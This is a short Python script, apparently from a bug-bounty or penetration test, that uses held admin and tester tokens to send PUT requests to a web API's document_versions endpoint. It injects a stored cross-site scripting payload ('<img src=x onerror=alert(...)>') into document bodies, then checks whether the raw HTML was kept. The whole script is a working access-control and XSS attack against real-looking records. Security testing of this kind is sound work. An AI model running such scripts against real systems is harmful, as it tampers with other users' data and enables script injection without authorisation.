import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
TT=open('/tmp/bac_TESTER').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or TOK),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== can SYSADMIN write a document body? (was 403 for Owner/Tester) ===")
tag='ZXB'+uuid.uuid4().hex[:5]
pay=f'<img src=x onerror=alert(document.domain)>{tag}'
for dv in [1371, 639, 1405]:
    c,b=req('GET',f'/api/v1/document_versions/{dv}')
    if c!='200': print(f"  docver {dv}: GET {c}"); continue
    o=json.loads(b)['document_versions'][0]
    print(f"\n  docver {dv}: doc={o.get('document_id')} body_len={len(str(o.get('body') or ''))} user={o.get('user_id')}")
    for shape in [{"document_version":{"body":pay}},
                  {"document_version":{"body":pay,"flat_body":pay}}]:
        c2,b2=req('PUT',f'/api/v1/document_versions/{dv}',shape)
        print(f"    PUT {list(shape['document_version'].keys())} -> {c2} {b2[:100].replace(chr(10),' ')}")
        if c2=='200':
            c3,b3=req('GET',f'/api/v1/document_versions/{dv}')
            st=json.loads(b3)['document_versions'][0]
            print(f"      stored body={str(st.get('body'))[:110]!r}")
            print(f"      RAW={'<img' in str(st.get('body'))}")
            break
